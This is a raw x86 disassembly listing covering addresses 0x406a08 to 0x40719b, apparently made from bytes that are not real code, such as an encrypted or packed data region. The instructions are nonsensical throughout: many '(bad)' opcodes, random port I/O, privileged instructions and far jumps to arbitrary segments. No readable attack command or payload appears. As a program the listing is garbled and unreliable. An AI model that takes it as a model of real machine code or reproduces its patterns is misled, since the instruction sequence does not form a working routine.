  406a08:	sbb    eax,0xe33bbd42
  406a0d:	and    BYTE PTR [edi+0x8],0x5f
  406a11:	mov    ch,0xa3
  406a13:	ss push ds
  406a15:	test   BYTE PTR [ebx+0x34],dh
  406a18:	faddp  st(2),st
  406a1a:	(bad)  
  406a1b:	adc    edi,DWORD PTR [ebx]
  406a1d:	push   0xffffffc4
  406a1f:	push   0x10c2915
  406a24:	sbb    DWORD PTR [ecx],0x66abed36
  406a2a:	mov    edi,0x693eb617
  406a2f:	jae    0x406a68
  406a31:	dec    ecx
  406a32:	lds    esp,FWORD PTR [esi+ecx*8-0x2b151040]
  406a39:	dec    ecx
  406a3a:	jmp    0xe57c34fb
  406a3f:	stos   DWORD PTR es:[edi],eax
  406a40:	test   DWORD PTR [edx+0x4e9ba538],esi
  406a46:	xor    edi,DWORD PTR [esi+0x7c9474b2]
  406a4c:	mov    ds:0xd5f1ec37,eax
  406a51:	adc    al,0xb1
  406a53:	sub    cl,BYTE PTR [edi]
  406a55:	mov    ds:0x80c1bf71,al
  406a5a:	out    0x9f,eax
  406a5c:	clc    
  406a5d:	inc    ebx
  406a5e:	out    0x12,eax
  406a60:	cmp    esi,0x96f2b99e
  406a66:	sub    ebx,DWORD PTR [eax-0x7bd41921]
  406a6c:	pop    es
  406a6d:	xor    dh,dl
  406a6f:	and    eax,0x2819dc0
  406a74:	icebp  
  406a75:	cmp    ch,cl
  406a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a78:	push   0xffffffb7
  406a7a:	ds mov edx,0x73cdc9c9
  406a80:	icebp  
  406a81:	or     BYTE PTR [ebx],al
  406a83:	arpl   WORD PTR [ebx+0x2d],bx
  406a86:	inc    DWORD PTR [ecx-0x34a303f4]
  406a8c:	data16 (bad) 
  406a8e:	out    dx,eax
  406a8f:	les    edx,FWORD PTR [ebp+0x43485587]
  406a95:	popf   
  406a96:	inc    esp
  406a97:	test   BYTE PTR [edx],ch
  406a99:	imul   esi,DWORD PTR [eax+0x16],0xb
  406a9d:	xor    DWORD PTR [edi+esi*1],eax
  406aa0:	das    
  406aa1:	sbb    al,0x9b
  406aa3:	xor    edx,DWORD PTR [edx]
  406aa5:	and    BYTE PTR [ebx+edx*2-0x70],bh
  406aa9:	sbb    eax,0x4383c51c
  406aae:	bound  edx,QWORD PTR [edi]
  406ab0:	pusha  
  406ab1:	jg     0x406b01
  406ab3:	out    0xd7,eax
  406ab5:	out    dx,eax
  406ab6:	sbb    BYTE PTR [ecx+0x38],bh
  406ab9:	test   eax,0x84ed3ea9
  406abf:	(bad)  
  406ac0:	es sbb eax,0xfbdee84e
  406ac6:	js     0x406adf
  406ac8:	ret    0xb0d4
  406acb:	xor    bl,BYTE PTR [esp+ebx*2]
  406ace:	mov    ah,0x82
  406ad0:	hlt    
  406ad1:	das    
  406ad2:	pop    ds
  406ad3:	arpl   WORD PTR [eax-0x2b604f30],di
  406ad9:	shl    BYTE PTR [edi+ebp*4],0xf4
  406add:	mov    ?,WORD PTR [eax+esi*8+0x32cc6233]
  406ae4:	mov    bl,0xc9
  406ae6:	xchg   esi,eax
  406ae7:	inc    ebx
  406ae8:	test   BYTE PTR [ebx-0xc5e2156],dl
  406aee:	stos   DWORD PTR es:[edi],eax
  406aef:	cmp    edx,DWORD PTR [ebp+0x156fa5ef]
  406af5:	shr    BYTE PTR [edx],0xa7
  406af8:	addr16 dec eax
  406afa:	or     edi,esp
  406afc:	mov    edi,0x38dc4161
  406b01:	and    al,0x1e
  406b03:	mov    WORD PTR [ecx],ds
  406b05:	pop    ebx
  406b06:	mov    bh,0xe5
  406b08:	xor    DWORD PTR [esi+edi*8+0x53],0x26
  406b0d:	add    eax,0xe7ee1619
  406b12:	jmp    0x726e:0x4bf1eb42
  406b19:	(bad)  
  406b1a:	pushf  
  406b1b:	jmp    0xe7b0:0x31f1e4ec
  406b22:	repz (bad) 
  406b24:	sbb    eax,0xf7aa8fbe
  406b29:	lods   eax,DWORD PTR ds:[esi]
  406b2a:	mov    WORD PTR ds:0x67f94fa,cs
  406b30:	sub    bl,BYTE PTR [eax]
  406b32:	in     al,dx
  406b33:	and    DWORD PTR [esi+ebp*4+0x7e31dea6],eax
  406b3a:	lahf   
  406b3b:	pop    es
  406b3c:	loopne 0x406b59
  406b3e:	inc    ebx
  406b3f:	ja     0x406ba9
  406b41:	das    
  406b42:	xchg   DWORD PTR [ebx-0x59],esp
  406b45:	(bad)  
  406b46:	pop    eax
  406b47:	cmp    DWORD PTR [edi-0x6d],ecx
  406b4a:	mov    dl,0x85
  406b4c:	mov    al,0xce
  406b4e:	(bad)  
  406b4f:	ins    BYTE PTR es:[edi],dx
  406b50:	pop    ecx
  406b51:	cmpxchg DWORD PTR [edi+0x27],esp
  406b55:	xchg   edx,eax
  406b56:	jno    0x406aff
  406b58:	pop    esp
  406b59:	fidivr WORD PTR [ecx-0x79a89ca7]
  406b5f:	inc    esi
  406b60:	xchg   esp,eax
  406b61:	sub    eax,0x33be3ced
  406b66:	(bad)  
  406b67:	mov    ebx,0xfb1da84d
  406b6c:	sbb    BYTE PTR [esi-0x5ca1413],bl
  406b72:	dec    esp
  406b73:	leave  
  406b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b75:	jecxz  0x406b48
  406b77:	sahf   
  406b78:	(bad)  
  406b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b7a:	xor    dh,al
  406b7c:	and    esi,DWORD PTR [eax-0x38]
  406b7f:	pusha  
  406b80:	in     eax,dx
  406b81:	in     al,0xcc
  406b83:	sub    BYTE PTR [eax+0x6c],ah
  406b86:	fistp  DWORD PTR [esi+0x71]
  406b89:	xchg   esi,eax
  406b8a:	lods   al,BYTE PTR ds:[esi]
  406b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b8c:	cli    
  406b8d:	adc    eax,0x17b6227c
  406b92:	lahf   
  406b93:	clc    
  406b94:	dec    edi
  406b95:	xor    al,0xc6
  406b97:	pop    es
  406b98:	fisub  WORD PTR [edx]
  406b9a:	mov    ah,0x5f
  406b9c:	inc    edx
  406b9d:	mov    eax,0xa3003bcf
  406ba2:	push   edx
  406ba3:	jnp    0x406b57
  406ba5:	push   esi
  406ba6:	icebp  
  406ba7:	lods   eax,DWORD PTR ds:[esi]
  406ba8:	pusha  
  406ba9:	cmp    esp,edx
  406bab:	fwait
  406bac:	ss jb  0x406bfb
  406baf:	outs   dx,BYTE PTR ds:[esi]
  406bb0:	dec    ecx
  406bb1:	dec    edi
  406bb2:	aas    
  406bb3:	pop    ds
  406bb4:	in     al,0x97
  406bb6:	sub    eax,0x7dbc8391
  406bbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bbc:	add    eax,0x783f52b9
  406bc1:	inc    ecx
  406bc2:	dec    ecx
  406bc3:	jae    0x406bfe
  406bc5:	loop   0x406b90
  406bc7:	daa    
  406bc8:	into   
  406bc9:	sub    eax,0x73e80238
  406bce:	jg     0x406ba7
  406bd0:	adc    eax,0xdadbcaee
  406bd5:	and    ecx,DWORD PTR [ecx+edx*1]
  406bd8:	es sbb eax,0x139f5e92
  406bde:	(bad)  
  406bdf:	xor    DWORD PTR [ecx-0x16],ecx
  406be2:	out    dx,al
  406be3:	mov    ebx,0x3ac2f06
  406be8:	adc    ebp,DWORD PTR [ebp+0x1e]
  406beb:	fwait
  406bec:	mov    ebp,0x309a4697
  406bf1:	shr    DWORD PTR [ecx],1
  406bf3:	pop    edx
  406bf4:	sti    
  406bf5:	retf   
  406bf6:	xchg   ebx,eax
  406bf7:	mov    edi,0x3c804ba1
  406bfc:	fwait
  406bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bfe:	js     0x406c4a
  406c00:	dec    ebp
  406c01:	repz and edx,DWORD PTR [eax]
  406c04:	jmp    0x5c51f6b8
  406c09:	mov    al,BYTE PTR [ebp-0x7d]
  406c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c0d:	adc    eax,0xd9eab6cf
  406c12:	dec    edx
  406c13:	mov    edi,0xeaeeb5fa
  406c18:	jnp    0x406c32
  406c1a:	sbb    DWORD PTR [eax-0x3ba0b63a],0x34f89bda
  406c24:	sbb    DWORD PTR [ebx],0x8f0742a2
  406c2a:	cdq    
  406c2b:	pop    ebx
  406c2c:	xlat   BYTE PTR ds:[ebx]
  406c2d:	fucomip st,st(2)
  406c2f:	push   edx
  406c30:	push   ebp
  406c31:	pop    esp
  406c32:	sub    al,0x6c
  406c34:	xchg   edi,eax
  406c35:	mov    dl,0x6e
  406c37:	nop    ebp
  406c3a:	jno    0x406c6d
  406c3c:	adc    ch,ch
  406c3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c3f:	enter  0x3976,0xda
  406c43:	fld    TBYTE PTR [ebx+edi*4-0x48bc058c]
  406c4a:	(bad)  
  406c4b:	pop    edx
  406c4c:	fild   DWORD PTR [ebp+0x47]
  406c4f:	xor    BYTE PTR [eax-0xd1c0d0d],bh
  406c55:	push   eax
  406c56:	fcomp  QWORD PTR [ebx+0x6cc8d2fe]
  406c5c:	cli    
  406c5d:	jbe    0x406c75
  406c5f:	mov    ebp,0xb2d2e0d1
  406c64:	sahf   
  406c65:	test   al,0x1a
  406c67:	scas   al,BYTE PTR es:[edi]
  406c68:	fistp  QWORD PTR [ebx-0x28]
  406c6b:	pop    ebx
  406c6c:	les    esi,FWORD PTR [edi]
  406c6e:	(bad)  
  406c6f:	pop    esp
  406c70:	sbb    eax,0x601858e8
  406c75:	and    BYTE PTR [ecx],bh
  406c77:	pop    esi
  406c78:	mov    esp,0x322fb4ba
  406c7d:	sub    dl,dh
  406c7f:	xchg   esp,eax
  406c80:	and    BYTE PTR [ebp+0x62],0x13
  406c84:	xor    ebp,DWORD PTR [edi]
  406c86:	jmp    0x68ca:0xf39d4a60
  406c8d:	js     0x406c20
  406c8f:	push   0x60
  406c91:	mov    ebx,0x1431cd51
  406c96:	ret    
  406c97:	aam    0xa6
  406c99:	adc    esi,DWORD PTR [ebp+esi*1-0x10]
  406c9d:	sbb    al,0xdd
  406c9f:	(bad)  
  406ca0:	cmp    eax,0x447dfab9
  406ca5:	cli    
  406ca6:	sbb    BYTE PTR [esi-0x59],ch
  406ca9:	stc    
  406caa:	sbb    al,0xb
  406cac:	dec    ebp
  406cad:	and    esi,0xd0dfa54a
  406cb3:	les    ebx,FWORD PTR [eax+0x72355ac]
  406cb9:	ja     0x406c8a
  406cbb:	addr16 push esp
  406cbd:	in     al,dx
  406cbe:	jb     0x406cbe
  406cc0:	jno    0x406d3b
  406cc2:	or     al,0x3b
  406cc4:	fadd   DWORD PTR [esi-0x51637f08]
  406cca:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  406ccc:	fwait
  406ccd:	xor    ch,BYTE PTR [edi+edx*8-0x3313357f]
  406cd4:	mov    edx,0x65b1cbdd
  406cd9:	ror    BYTE PTR [esi+0x76c2b4cc],0x17
  406ce0:	bound  esi,QWORD PTR [ebx+0x45ed220d]
  406ce6:	push   ebp
  406ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce8:	push   ebx
  406ce9:	pop    ebp
  406cea:	xor    esp,esp
  406cec:	dec    edx
  406ced:	scas   eax,DWORD PTR es:[edi]
  406cee:	cld    
  406cef:	xlat   BYTE PTR ds:[ebx]
  406cf0:	out    0x80,eax
  406cf2:	mov    ebx,0x480c4bf1
  406cf7:	fs cli 
  406cf9:	test   BYTE PTR [ebp+0x3f54a4ac],dl
  406cff:	cwde   
  406d00:	fistp  WORD PTR [esi]
  406d02:	sub    edi,edx
  406d04:	out    dx,al
  406d05:	(bad)  
  406d06:	xor    ch,ah
  406d08:	test   eax,0xd761922
  406d0d:	retf   0x5e6c
  406d10:	pop    ds
  406d11:	or     dh,BYTE PTR [ebx]
  406d13:	or     BYTE PTR [ecx+0x7c],0x33
  406d17:	inc    eax
  406d18:	aad    0x78
  406d1a:	loopne 0x406d34
  406d1c:	sub    DWORD PTR [ebx],0x18
  406d1f:	push   ecx
  406d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d21:	mov    cl,al
  406d23:	pop    ebp
  406d24:	jmp    0x8ca8:0x37abc6fc
  406d2b:	dec    eax
  406d2c:	cmp    DWORD PTR [edx-0x2e100cdc],esi
  406d32:	retf   
  406d33:	sub    DWORD PTR [edi+0x36076cae],esp
  406d39:	cmp    al,BYTE PTR [ecx-0x10]
  406d3c:	(bad)  
  406d3d:	iret   
  406d3e:	aam    0x3b
  406d40:	call   DWORD PTR [edx-0x75]
  406d43:	popa   
  406d44:	and    edi,edx
  406d46:	push   eax
  406d47:	xchg   esp,eax
  406d48:	xchg   ebp,eax
  406d49:	push   esp
  406d4a:	out    dx,eax
  406d4b:	add    eax,0xfa7b2405
  406d50:	cld    
  406d51:	jg     0x406d10
  406d53:	aam    0x4
  406d55:	(bad)  
  406d56:	mov    edx,0xf7a63cba
  406d5b:	das    
  406d5c:	sbb    bh,BYTE PTR [ecx]
  406d5e:	imul   ebx,DWORD PTR es:[edx+0x4225bf8a],0xfdc0846f
  406d69:	or     al,0xc9
  406d6b:	xor    esi,0x4fb2c37c
  406d71:	inc    BYTE PTR [ebx+0x1e29b9db]
  406d77:	push   esp
  406d78:	inc    BYTE PTR [ebp+0x48]
  406d7b:	ins    DWORD PTR es:[edi],dx
  406d7c:	adc    BYTE PTR [ebx+0x1c],bl
  406d7f:	adc    DWORD PTR [edi+0xe],esi
  406d82:	sub    al,0xa0
  406d84:	sub    DWORD PTR [edx+0x5b],ecx
  406d87:	push   esp
  406d88:	sub    eax,0xa8705a24
  406d8d:	adc    eax,0xe89e8ae2
  406d92:	jle    0x406dfc
  406d94:	jecxz  0x406da6
  406d96:	icebp  
  406d97:	pop    ebp
  406d98:	daa    
  406d99:	jae    0x406dee
  406d9b:	mov    eax,0x534dee64
  406da0:	and    edx,DWORD PTR [ebp-0x13]
  406da3:	popa   
  406da4:	add    al,0x42
  406da6:	jmp    0x7898:0xebf19d3c
  406dad:	or     ebp,DWORD PTR gs:[esi+0x69e2d994]
  406db4:	pop    edx
  406db5:	stos   BYTE PTR es:[edi],al
  406db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406db7:	iret   
  406db8:	inc    ecx
  406db9:	pop    ecx
  406dba:	ja     0x406e05
  406dbc:	add    al,0x8d
  406dbe:	xor    al,BYTE PTR [esi+0xd98dcaf]
  406dc4:	call   0xe0918ecd
  406dc9:	xchg   ebx,eax
  406dca:	call   0xdd92:0x46026c4
  406dd1:	dec    edi
  406dd2:	add    BYTE PTR [edx+0x56],cl
  406dd5:	pushf  
  406dd6:	fcmovnb st,st(5)
  406dd8:	adc    BYTE PTR [edi],al
  406dda:	sti    
  406ddb:	inc    ecx
  406ddc:	repnz addr16 mov eax,ds:0xd0f4
  406de1:	and    eax,0x9f6cc51e
  406de6:	dec    ebp
  406de7:	cli    
  406de8:	mov    cl,al
  406dea:	add    edi,edx
  406dec:	cld    
  406ded:	push   ebx
  406dee:	push   esp
  406def:	adc    ecx,DWORD PTR [ecx-0x3c]
  406df2:	dec    edi
  406df3:	dec    esi
  406df4:	fisub  DWORD PTR [ecx+edi*8+0x11e1c297]
  406dfb:	jp     0x406e69
  406dfd:	call   0xcb24:0xa0bddbc8
  406e04:	add    ecx,DWORD PTR [ebp-0x5dd089d9]
  406e0a:	add    DWORD PTR [edi],edx
  406e0c:	std    
  406e0d:	lds    esp,FWORD PTR [esi-0x4a]
  406e10:	push   ds
  406e11:	cmp    WORD PTR [ebx+0x59],0x1624
  406e17:	rol    edx,cl
  406e19:	mov    ebx,0x73ad7df
  406e1e:	les    ebx,FWORD PTR [edi+0x4c]
  406e21:	in     al,0x85
  406e23:	iret   
  406e24:	imul   ecx,edi,0x3fd85494
  406e2a:	stos   DWORD PTR es:[edi],eax
  406e2b:	aaa    
  406e2c:	retf   0xdaf5
  406e2f:	out    0xae,eax
  406e31:	xlat   BYTE PTR ds:[ebx]
  406e32:	mov    bl,0xae
  406e34:	test   al,cl
  406e36:	dec    edi
  406e37:	(bad)  
  406e38:	(bad)  
  406e39:	fcomp  DWORD PTR [ebp+0x5e]
  406e3c:	cmp    BYTE PTR [ecx-0x719a7df1],0xf5
  406e43:	call   0xa444:0xd3e243f6
  406e4a:	pop    ss
  406e4b:	lods   eax,DWORD PTR ds:[esi]
  406e4c:	daa    
  406e4d:	call   0x5138:0x959659ee
  406e54:	cwde   
  406e55:	mov    ss,WORD PTR [eax]
  406e57:	jp     0x406de3
  406e59:	stos   BYTE PTR es:[edi],al
  406e5a:	popa   
  406e5b:	mov    edx,0x8cb45ade
  406e60:	pusha  
  406e61:	in     al,0x6d
  406e63:	cmp    DWORD PTR [ecx-0x2e],ecx
  406e66:	pusha  
  406e67:	and    eax,0xe39cc80f
  406e6c:	jl     0x406e77
  406e6e:	jns    0x406e8d
  406e70:	mov    esi,0xc0ee917c
  406e75:	inc    esi
  406e76:	cmp    edi,DWORD PTR [edx-0x7e]
  406e79:	mov    ebp,0xb9fe2977
  406e7e:	mov    esp,0x3f55ef86
  406e83:	pop    edx
  406e84:	jo     0x406e76
  406e86:	das    
  406e87:	mov    dl,BYTE PTR [esi+0x2d]
  406e8a:	fcom   DWORD PTR [eax-0x2e]
  406e8d:	mov    ch,0xe5
  406e8f:	mov    ebx,0x2b8225dd
  406e94:	or     al,0xf4
  406e96:	lods   eax,DWORD PTR ds:[esi]
  406e97:	ins    DWORD PTR es:[edi],dx
  406e98:	ror    BYTE PTR [edx-0x7e],1
  406e9b:	lds    eax,FWORD PTR [ecx-0x578ee1d1]
  406ea1:	pop    ebx
  406ea2:	dec    ebx
  406ea3:	dec    edx
  406ea4:	jp     0x406e41
  406ea6:	adc    DWORD PTR [esi+0x46],edi
  406ea9:	fiadd  DWORD PTR [eax]
  406eab:	xchg   DWORD PTR [edi+0x30],edi
  406eae:	sbb    ch,BYTE PTR [esi+ebp*4+0x1c90bcdd]
  406eb5:	adc    eax,0x4c5da757
  406eba:	xor    eax,0xb89f6122
  406ebf:	xchg   BYTE PTR [ecx],ch
  406ec1:	cmp    cl,BYTE PTR [edx-0x777ccc29]
  406ec7:	clc    
  406ec8:	ins    DWORD PTR es:[edi],dx
  406ec9:	adc    ch,BYTE PTR ds:0xed878d04
  406ecf:	rcr    DWORD PTR [edi],1
  406ed1:	and    ecx,ebp
  406ed3:	or     DWORD PTR [ebp+edx*2-0x6f],ebx
  406ed7:	xchg   ecx,eax
  406ed8:	fsubr  QWORD PTR [ebx]
  406eda:	dec    edx
  406edb:	fild   DWORD PTR [ebx]
  406edd:	retf   0x50a1
  406ee0:	mov    bl,0x5d
  406ee2:	xlat   BYTE PTR ds:[ebx]
  406ee3:	push   ebx
  406ee4:	jle    0x406f63
  406ee6:	sti    
  406ee7:	pop    ds
  406ee8:	pop    edx
  406ee9:	fwait
  406eea:	adc    DWORD PTR [ebx+0x78],ecx
  406eed:	aaa    
  406eee:	mov    eax,0xc5947cb3
  406ef3:	cli    
  406ef4:	and    bh,al
  406ef6:	add    DWORD PTR [ecx-0x52],ebx
  406ef9:	and    esi,DWORD PTR [esi+0x6b]
  406efc:	dec    eax
  406efd:	lahf   
  406efe:	pop    eax
  406eff:	sub    edx,DWORD PTR [esi+edx*4]
  406f02:	adc    eax,0x8b36e5e2
  406f07:	xor    eax,0x57510dbc
  406f0c:	sbb    ch,ah
  406f0e:	adc    ecx,DWORD PTR [ebp+0x6]
  406f11:	retf   
  406f12:	loope  0x406f69
  406f14:	popa   
  406f15:	stos   BYTE PTR es:[edi],al
  406f16:	dec    esp
  406f17:	mov    cl,0xfd
  406f19:	mov    bh,0x51
  406f1b:	loop   0x406f7d
  406f1d:	bound  ecx,QWORD PTR [ebp-0x71b5ddba]
  406f23:	ror    ah,0x97
  406f26:	dec    ecx
  406f27:	outs   dx,BYTE PTR ds:[esi]
  406f28:	adc    BYTE PTR [ebx-0x5d3f6be4],dl
  406f2e:	adc    DWORD PTR [ebx+eiz*8],0xbcfada59
  406f35:	xor    DWORD PTR [edi+0x45e2fd98],0x47
  406f3c:	lds    ecx,FWORD PTR [ebx]
  406f3e:	pushf  
  406f3f:	dec    eax
  406f40:	out    dx,eax
  406f41:	mov    ebx,0xd22ec3dc
  406f46:	clc    
  406f47:	dec    ebp
  406f48:	test   eax,0x5a54f2c8
  406f4d:	pop    ss
  406f4e:	mul    bl
  406f50:	rcl    BYTE PTR [edx],cl
  406f52:	and    dl,cl
  406f54:	sbb    ebp,edi
  406f56:	add    DWORD PTR [edx-0x7],edi
  406f59:	lahf   
  406f5a:	shr    DWORD PTR [esi-0x1eb5ae97],cl
  406f60:	lods   eax,DWORD PTR ds:[esi]
  406f61:	es retf 0xe80e
  406f65:	ja     0x406f1a
  406f67:	test   al,0x2
  406f69:	outs   dx,BYTE PTR ds:[esi]
  406f6a:	mov    eax,ds:0x4b8af3c1
  406f6f:	call   0x27c0:0x6148505e
  406f76:	(bad)  
  406f77:	jl     0x406f6b
  406f79:	lahf   
  406f7a:	dec    ebx
  406f7b:	xchg   edi,eax
  406f7c:	neg    DWORD PTR [edi+0x277f5d20]
  406f82:	(bad)  
  406f83:	(bad)  
  406f84:	or     eax,0x26bdda8b
  406f89:	leave  
  406f8a:	mov    BYTE PTR [ebp-0x35],dh
  406f8d:	pop    edx
  406f8e:	std    
  406f8f:	cmp    eax,0x6eb29b7
  406f94:	outs   dx,DWORD PTR ds:[esi]
  406f95:	(bad)  
  406f96:	push   ss
  406f97:	(bad)  
  406f98:	jmp    0x406f77
  406f9a:	inc    esi
  406f9b:	out    0xb4,al
  406f9d:	stos   BYTE PTR es:[edi],al
  406f9e:	sub    cl,dh
  406fa0:	loope  0x406fb4
  406fa2:	pop    esi
  406fa3:	(bad)  
  406fa4:	in     eax,0xfc
  406fa6:	lahf   
  406fa7:	fisubr WORD PTR [eax]
  406fa9:	mov    ch,0xe5
  406fab:	dec    edi
  406fac:	jecxz  0x406ffe
  406fae:	mov    al,0x77
  406fb0:	stc    
  406fb1:	push   ebp
  406fb2:	ja     0x40701c
  406fb4:	or     esp,ebx
  406fb6:	ret    
  406fb7:	mov    al,0x8e
  406fb9:	jge    0x406fee
  406fbb:	push   es
  406fbc:	ret    
  406fbd:	push   es
  406fbe:	cmc    
  406fbf:	add    BYTE PTR [edx],dh
  406fc1:	sbb    bh,al
  406fc3:	mov    DWORD PTR [edi-0x2693a57e],ecx
  406fc9:	ins    DWORD PTR es:[edi],dx
  406fca:	and    BYTE PTR [ebx+edx*4+0x29599bfa],bh
  406fd1:	out    dx,al
  406fd2:	lds    ecx,FWORD PTR [ebx]
  406fd4:	adc    BYTE PTR [eax-0x6e2e3f91],bh
  406fda:	and    DWORD PTR [ecx+0x3fb41cf2],0xffffffba
  406fe1:	out    dx,eax
  406fe2:	in     al,0xa8
  406fe4:	clc    
  406fe5:	sub    eax,0xdd913544
  406fea:	rcl    BYTE PTR [edi-0x45],0xed
  406fee:	ins    DWORD PTR es:[edi],dx
  406fef:	sbb    al,0xa8
  406ff1:	retf   
  406ff2:	jno    0x407041
  406ff4:	rcl    BYTE PTR [ebp+0x3d],1
  406ff7:	add    BYTE PTR [ecx-0x33],dl
  406ffa:	mov    edi,0xd072ba57
  406fff:	jno    0x407007
  407001:	cmp    eax,0xefa12900
  407006:	fnstcw WORD PTR [esi+0x64]
  407009:	popa   
  40700a:	mov    ds:0x8ed6bc1a,eax
  40700f:	lahf   
  407010:	push   edi
  407011:	into   
  407012:	jg     0x407030
  407014:	addr16 mov bl,0xbe
  407017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407018:	inc    ebx
  407019:	loop   0x407014
  40701b:	in     al,dx
  40701c:	or     ah,BYTE PTR [esi-0x69]
  40701f:	push   edi
  407020:	sub    ah,BYTE PTR [eax-0x15baf05f]
  407026:	adc    DWORD PTR [ebp-0x75],ecx
  407029:	psllw  mm1,mm4
  40702c:	mov    al,0xf5
  40702e:	jnp    0x407056
  407030:	dec    eax
  407031:	(bad)  
  407032:	scas   eax,DWORD PTR es:[edi]
  407033:	mov    ds:0xf20562a1,eax
  407038:	(bad)  
  407039:	int    0x57
  40703b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40703c:	jge    0x4070ac
  40703e:	xchg   edi,eax
  40703f:	dec    ebx
  407041:	icebp  
  407042:	out    0xe1,eax
  407044:	jg     0x4070bd
  407046:	jnp    0x406fdb
  407048:	mov    edx,0xf62f224b
  40704d:	out    dx,eax
  40704e:	xor    al,0x78
  407050:	or     eax,DWORD PTR [ecx+0x1d]
  407053:	pop    esp
  407054:	outs   dx,BYTE PTR ds:[esi]
  407055:	or     DWORD PTR [ebx-0x7f],0x136a6a05
  40705c:	sahf   
  40705d:	xchg   ebp,eax
  40705e:	mov    bl,0xd5
  407060:	jno    0x406fe8
  407062:	or     BYTE PTR [ebx+0x6a],ah
  407065:	(bad)  
  407066:	mov    dh,0x24
  407068:	jg     0x4070de
  40706a:	loop   0x4070b3
  40706c:	ds jbe 0x4070c2
  40706f:	dec    ecx
  407070:	cdq    
  407071:	cwde   
  407072:	lock inc esp
  407074:	mov    cl,0x61
  407076:	dec    eax
  407077:	loop   0x40707b
  407079:	dec    ebp
  40707a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40707b:	data16 test BYTE PTR [esi],cl
  40707e:	(bad)  
  407080:	sub    eax,0xedc252c0
  407085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407086:	cmp    BYTE PTR [edx+0x646b9a82],dl
  40708c:	aam    0xf6
  40708e:	adc    dl,BYTE PTR [esp+eiz*8+0xf]
  407092:	jae    0x407016
  407094:	fnsave [edi-0x2ed7394]
  40709a:	or     al,0x71
  40709c:	iret   
  40709d:	inc    ebp
  40709e:	jg     0x4070a6
  4070a0:	stc    
  4070a1:	aas    
  4070a2:	icebp  
  4070a3:	push   eax
  4070a4:	shl    DWORD PTR [eax],0xf4
  4070a7:	mov    esi,0xf7d506f7
  4070ac:	lods   eax,DWORD PTR ds:[esi]
  4070ad:	adc    bl,bl
  4070af:	rcr    edi,0x90
  4070b2:	push   ebx
  4070b3:	mul    BYTE PTR [ebx+0x4d]
  4070b6:	mov    eax,0x3300f48f
  4070bb:	arpl   WORD PTR [si],bp
  4070be:	cmp    al,0x47
  4070c0:	mov    dl,0x9e
  4070c2:	out    0x90,eax
  4070c4:	mov    esi,0xd317ebf9
  4070c9:	pop    edx
  4070ca:	sub    eax,0x7e43c68a
  4070cf:	(bad)  
  4070d0:	adc    cl,BYTE PTR [eax+ebp*1]
  4070d3:	or     DWORD PTR [esi+ebx*8],ebp
  4070d6:	mov    ch,0x76
  4070d8:	mov    ecx,DWORD PTR [edx+0x26]
  4070db:	cmp    DWORD PTR [edx],edx
  4070dd:	xchg   esi,eax
  4070de:	inc    edi
  4070df:	in     al,dx
  4070e0:	clc    
  4070e1:	add    al,0x9d
  4070e3:	push   edx
  4070e4:	shr    BYTE PTR [edi+0x2d44e04b],0x7d
  4070eb:	xlat   BYTE PTR ds:[ebx]
  4070ec:	pusha  
  4070ed:	push   esp
  4070ee:	lahf   
  4070ef:	aas    
  4070f0:	stos   BYTE PTR es:[edi],al
  4070f1:	int    0x16
  4070f3:	and    BYTE PTR [esi-0x18],ch
  4070f6:	ins    DWORD PTR es:[edi],dx
  4070f7:	jno    0x407178
  4070f9:	into   
  4070fa:	fsubr  st(1),st
  4070fc:	inc    esp
  4070fd:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ff:	hlt    
  407100:	mov    edx,DWORD PTR [eax-0x3193dc87]
  407106:	jle    0x40717b
  407108:	js     0x407141
  40710a:	dec    edi
  40710b:	inc    ebx
  40710c:	adc    DWORD PTR [edi+0x13],edi
  40710f:	mov    esi,0xb2725727
  407114:	imul   edx,ebx,0x52f80600
  40711a:	xor    al,BYTE PTR [ecx-0x2dcaf3a2]
  407120:	mov    ebx,DWORD PTR [ebx+0x26]
  407123:	sub    DWORD PTR [ecx],0xf8b519f2
  407129:	jo     0x4070dc
  40712b:	jmp    0xce893f0c
  407130:	mov    edi,DWORD PTR [ecx+0x1a2fcf47]
  407136:	mov    ebp,0x564aefca
  40713b:	aad    0x44
  40713d:	push   ds
  40713e:	xor    ah,dl
  407140:	dec    esp
  407141:	jg     0x407189
  407143:	inc    BYTE PTR [eax]
  407145:	or     dl,BYTE PTR [esp+eiz*4-0x42d710d4]
  40714c:	jle    0x407178
  40714e:	push   cs
  40714f:	inc    ecx
  407150:	mul    BYTE PTR [esp+ebx*2]
  407153:	loop   0x407142
  407155:	cmp    ebx,DWORD PTR [edx-0x80]
  407158:	adc    eax,0xe0efdec9
  40715d:	test   eax,0x4b9c0768
  407162:	sub    dl,BYTE PTR [ecx]
  407164:	lahf   
  407165:	push   eax
  407166:	pop    eax
  407167:	pop    edx
  407168:	xor    BYTE PTR [eax-0x32],ah
  40716b:	push   esp
  40716c:	or     BYTE PTR [ecx+0x7e],cl
  40716f:	pop    esi
  407170:	push   ebp
  407171:	adc    bl,bl
  407173:	xchg   esp,eax
  407174:	adc    bh,bh
  407176:	repz icebp 
  407178:	sbb    BYTE PTR ss:[ecx-0x6615a624],0x54
  407180:	idiv   DWORD PTR [ecx]
  407182:	or     bl,al
  407184:	in     eax,0xf1
  407186:	or     dl,bl
  407188:	es jno 0x4071d9
  40718b:	mov    ah,0x8c
  40718d:	xor    eax,0x3ddd1350
  407192:	clc    
  407193:	in     eax,0x3c
  407195:	mov    ecx,0xdc88c48c
  40719a:	into   
  40719b:	retf   0x66
